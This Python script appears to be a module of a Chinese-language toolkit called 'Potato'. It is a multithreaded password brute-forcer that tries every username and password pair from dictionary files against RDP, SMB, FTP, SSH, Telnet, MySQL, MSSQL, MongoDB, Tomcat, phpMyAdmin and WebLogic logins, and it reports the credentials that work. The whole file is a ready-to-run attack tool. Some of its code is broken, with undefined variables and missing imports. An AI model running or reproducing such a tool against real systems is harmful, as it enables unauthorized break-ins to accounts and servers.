#!/usr/bin/python
# -*- coding:utf-8

import os,re
import sys,threadpool,threading,requests
import itertools
from impacket import smb
import ftplib

sys.path.append('..')
from common.font import *
from common.pubOptimization import *
#防止高频调用导致堵塞，可对某些字段进行存储
Processing=str(Processing())
Information=str(Information())
Detected=str(Detected())
Result=str(Result())
Error=str(Error())

try:
    import wmi
except:
    print(Processing+'检测出您未安装wmi模块，将替您安装此模块，请稍候……')
    os.system('pip install wmi')
    import wmi
try:
    import paramiko
except:
    print(Processing+'检测出您未安装paramiko模块，将替您安装此模块，请稍候……')
    os.system('pip install paramiko')
    import paramiko
try:
    import MySQLdb
except:
    print(Processing+'检测出您未安装mysqlclient模块，将替您安装此模块，请稍候……')
    os.system('pip install ../lib/mysqlclient-1.4.6-cp38-cp38-win32.whl')
    import MySQLdb
try:
    import pymssql
except:
    print(Processing+'检测出您未安装pymssql模块，将替您安装此模块，请稍候……')
    os.system('pip install pymssql')
    import pymssql
try:
    from pymongo import MongoClient
except:
    print(Processing+'检测出您未安装pymongo模块，将替您安装此模块，请稍候……')
    os.system('pip install pymongo')
    from pymongo import MongoClient
	
Lock = threading.Lock()
ipaddress=''
port=22
url=''
ThreadNum=100
resultList=[]

def conf(type):
    users=[]
    passwds=[]
    dataList=[]
    global ipaddress
    global port
    global url
    global ThreadNum
#设置IP
    while type=='isIp':
        ipaddressData=input(bold('请输入爆破的IP：		（例：127.0.0.1）\n\n')+Input())
        if ipaddressData=='':
            print(Error+'IP不可为空！\n')
        else:
            ipaddress=ipaddressData
            type=''
#设置url
    while type=='isUrl':
        urlData=input(bold('请输入登录url：		（例：http://39.107.255.163:9999/index.php）\n\n')+Input())
        if urlData=='':
            print(Error+'IP不可为空！\n')
        else:
            url=urlData
            type=''
#设置IP和Port
    while type=='isIpPort':
        isHost=1
        p = re.compile('^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$')
        while isHost:
            ipaddress=input(bold('请输入爆破的IP：		（例：127.0.0.1）\n\n')+Input())
            if p.match(ipaddress):
                isHost=0
            else:
                print('\n'+Error+'IP格式错误，请重新输入……\n')
        try:
            portData=int(input(bold('\n请输入爆破的端口号：		（例：22）\n\n')+Input()))
            if portData=='':
                print(Error+'端口号不可为空！\n')
            else:
                port=portData
                type=''
        except:
            print(Error+'输入格式错误，请重新输入！\n')
#设置用户名字典
    userPath=input('\n'+bold(r'请输入用户名字典：		（默认：.\user.txt）')+'\n\n'+Input())
    try:
        userfile=open(userPath)
    except:
        print(Information+'输入字典有误，将使用默认字典')
        userfile=open(r'.\user.txt')
    for user in userfile.readlines():
        users.append(user.rstrip("\n"))
#设置密码字典
    passwdPath=input(bold('\n请设置密码字典：		（默认：.\passwd.txt）\n\n')+Input())
    try:
        passwdfile=open(passwdPath)
    except:
        print(Information+'输入字典有误，将使用默认字典')
        passwdfile=open(r'.\passwd.txt')
    for passwd in passwdfile.readlines():
        passwds.append(passwd.rstrip("\n"))

    try:    #以防无法转int报错
        ThreadNum=int(input(bold('\n请输入扫描的线程数：		（默认：100）\n\n')+Input()))
    except:
        ThreadNum=100

    print(Processing+'加载数据中……\n')

    dataProduct=list(itertools.product(users,passwds))#账号密码进行笛卡尔积运算
    for data in dataProduct:#进行数组嵌套，防止多线程导致的bug
        dataBody=[]
        dataBody.append(data)
        dataList.append(dataBody)
    return dataList

def choseObj():
    print("\n"+Information+ r"欢迎使用Potato，请选择:")
    print("""\033[1m
		
1. RDP			2. SMB			3. FTP
4. SSH			5. Telnet		6. Mysql
7. MSsql		8. Mongodb		9. Tomcat
10.phpMyAdmin		11.webLogic
									\033[0m""")
    funcChose=input("\n"+Input())
    if funcChose == '1':
        func=rdpConn
        type='isIp'
    elif funcChose == '2':
        func=smbConn
        type='isIp'
    elif funcChose == '3':
        func=ftpConn
        type='isIpPort'
    elif funcChose == '4':
        func=sshConn
        type='isIpPort'
    elif funcChose == '5':
        func=telnetConn
        type='isIp'
    elif funcChose == '6':
        func=mysqlConn
        type='isIpPort'
    elif funcChose == '7':
        func=mssqlConn
        type='isIpPort'
    elif funcChose == '8':
        func=mongodbConn
        type='isIpPort'
    elif funcChose == '9':
        func=tomcatConn
        type='isUrl'
    elif funcChose == '10':
        func=phpMyAdminConn
        type='isUrl'
    elif funcChose == '11':
        func=webLogicConn
        type='isUrl'
    print('')
    print(Processing+'请先配置该模块……\n')
    dataList=conf(type)
    print(Processing+'开启多线程模式……\n')
    requ = threadpool.makeRequests(func,dataList) 
    pool = threadpool.ThreadPool(ThreadNum)
    print(Processing+'正在进行爆破……\n')
    [pool.putRequest(func) for func in requ] 
    pool.wait()
    print('\n'+Information+'爆破结果如下：')
    for i in resultList:
        print(Result+i)
		
def rdpConn(dataList):
    try:
        conn = wmi.WMI(computer=ipaddress, user=dataList[0][0], password=dataList[0][1])
        for sys in conn.Win32_OperatingSystem():
            Lock.acquire()#多线程锁
            print(Result+"IP：%s\t账号：%s\t密码：%s"%(ipaddress,dataList[0][0],dataList[0][1]))
            print(Detected+"Version:%s" % sys.Caption.encode("UTF8"),"Vernum:%s" % sys.BuildNumber)  #系统信息
            print(Detected+sys.OSArchitecture.encode("UTF8"))  # 系统的位数
            print(Detected+sys.NumberOfProcesses)  # 系统的进程数
            Lock.release()#多线程解锁
            resultList.append("账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
    except BaseException as error:
        Lock.acquire()#多线程锁
        print(Information+"%s\t%s\t账号或错误！"%(dataList[0][0],dataList[0][1]))
        print(error)
        Lock.release()#多线程解锁

def phpMyAdminConn(dataList):
    try:
        data={'pma_username':dataList[0][0],'pma_password':dataList[0][1]}
        response = requests.post(url,data=data,timeout=5)
        result=response.content.decode('utf-8')#页面返回编码根据实体情况修改(gbk/无需解码)
        if result.find('name="login_form"')==-1:
            Lock.acquire()#多线程锁
            print(Result+"账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
            Lock.release()#多线程解锁
            resultList.append("账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
        else:
            Lock.acquire()#多线程锁
            print(Information+"%s\t%s\t账号或错误！"%(dataList[0][0],dataList[0][1]))
            Lock.release()#多线程解锁
    except BaseException as error:
        Lock.acquire()#多线程锁
        print(error)
        Lock.release()#多线程解锁

def webLogicConn(dataList):
    try:
        data={'j_username':dataList[0][0],'j_password':dataList[0][1]}
        response = requests.post(url,data=data,timeout=5)
        result=response.content.decode('utf-8')#页面返回编码根据实体情况修改(gbk/无需解码)
        if result.count('console.portal')!=0:
            Lock.acquire()#多线程锁
            print(Result+"账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
            Lock.release()#多线程解锁
            resultList.append("账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
        else:
            Lock.acquire()#多线程锁
            print(Information+"%s\t%s\t账号或错误！"%(dataList[0][0],dataList[0][1]))
            Lock.release()#多线程解锁
    except BaseException as error:
        Lock.acquire()#多线程锁
        print(Error+error)
        Lock.release()#多线程解锁

def smbConn(dataList):
    try:
        client = smb.SMB('*SMBSERVER',ipaddress)
        client.login(user,pwd)
        Lock.acquire()#多线程锁
        print(Result+"账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
        Lock.release()#多线程解锁
        resultList.append("账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
    except:
        Lock.acquire()#多线程锁
        print(Information+"%s\t%s\t账号或错误！"%(dataList[0][0],dataList[0][1]))
        Lock.release()#多线程解锁

def ftpConn(dataList):
    try:
        ftp = ftplib.FTP()
        ftp.connect(ipaddress,port,2)
        ftp.login(dataList[0][0],dataList[0][1])
        ftp.quit()
        Lock.acquire()#多线程锁
        print(Result+"账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
        Lock.release()#多线程解锁
        resultList.append("账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
    except:
        Lock.acquire()#多线程锁
        print(Information+"%s\t%s\t账号或错误！"%(dataList[0][0],dataList[0][1]))
        Lock.release()#多线程解锁
		
def sshConn(dataList):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ipaddress,port,dataList[0][0],dataList[0][1],timeout=5)
        Lock.acquire()#多线程锁
        print(Result+"账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
        Lock.release()#多线程解锁
        resultList.append("账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
        ssh.close()
    except:
        Lock.acquire()#多线程锁
        print(Information+"%s\t%s\t账号或错误！"%(dataList[0][0],dataList[0][1]))
        Lock.release()#多线程解锁

def telnetConn(dataList):
    try:
        tn = telnetlib.Telnet(ipaddress,timeout=5)
        tn.set_debuglevel(0)
        tn.read_until("login: ")
        tn.write(dataList[0][0] + '\r\n')
        tn.read_until("assword: ")
        tn.write(dataList[0][1] + '\r\n')
        result = tn.read_some()
        result = result+tn.read_some()
        if result.find('Login Fail')>0 or result.find('incorrect')>0:
            Lock.acquire()#多线程锁
            print(Information+"%s\t%s\t账号或错误！"%(dataList[0][0],dataList[0][1]))
            Lock.release()#多线程解锁
        else:
            Lock.acquire()#多线程锁
            print(Result+"账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
            Lock.release()#多线程解锁
            resultList.append("账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
        tn.close()
    except:
        Lock.acquire()#多线程锁
        print(Information+"%s\t%s\t账号或错误！"%(dataList[0][0],dataList[0][1]))
        Lock.release()#多线程解锁
		
def mysqlConn(dataList):
    try:
        db = MySQLdb.connect(host=ipaddress, user=dataList[0][0], passwd=dataList[0][1],port=port)
        Lock.acquire()#多线程锁
        print(Result+"账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
        Lock.release()#多线程解锁
        resultList.append("账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
        db.close()
    except:
        Lock.acquire()#多线程锁
        print(Information+"%s\t%s\t账号或错误！"%(dataList[0][0],dataList[0][1]))
        Lock.release()#多线程解锁

def mssqlConn(dataList):
    try:
        db = pymssql.connect(host=ipaddress,user=dataList[0][0],password=dataList[0][1],port=port)
        Lock.acquire()#多线程锁
        print(Result+"账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
        Lock.release()#多线程解锁
        resultList.append("账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
        db.close()
    except:
        Lock.acquire()#多线程锁
        print(Information+"%s\t%s\t账号或错误！"%(dataList[0][0],dataList[0][1]))
        Lock.release()#多线程解锁
		
def mongodbConn(dataList):
    try:
        client = MongoClient(ipaddress,port)
        db_auth = client.admin
        flag = db_auth.authenticate(dataList[0][0], dataList[0][1])
        if flag == True:
            Lock.acquire()#多线程锁
            print(Result+"账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
            Lock.release()#多线程解锁
            resultList.append("账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
    except:
        Lock.acquire()#多线程锁
        print(Information+"%s\t%s\t账号或错误！"%(dataList[0][0],dataList[0][1]))
        Lock.release()#多线程解锁

def tomcatConn(dataList):
    try:
        user_agent = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"  
        Authorization = "Basic %s" % (base64.b64encode(dataList[0][0]+':'+dataList[0][1]))
        header = { 'User-Agent' : user_agent , 'Authorization':Authorization} 
        request = urllib2.Request(url,headers=header)
        response = urllib2.urlopen(request,timeout=5)
        result=response.read()
        if response.code ==200:
            Lock.acquire()#多线程锁
            print(Result+"账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
            Lock.release()#多线程解锁
            resultList.append("账号：%s\t密码：%s"%(dataList[0][0],dataList[0][1]))
    except:
        Lock.acquire()#多线程锁
        print(Information+"%s\t%s\t账号或错误！"%(dataList[0][0],dataList[0][1]))
        Lock.release()#多线程解锁
		
def Quit(signum, frame):	#解决Ctrl+c报错
    Lock.acquire()#多线程锁
    print('\n'+Error+'已主动结束任务')
    print('\n'+Information+'爆破结果如下：')
    for i in resultList:
        print(Result+i)
    sys.exit()
signal.signal(signal.SIGINT, Quit)
signal.signal(signal.SIGTERM, Quit)
		
choseObj()
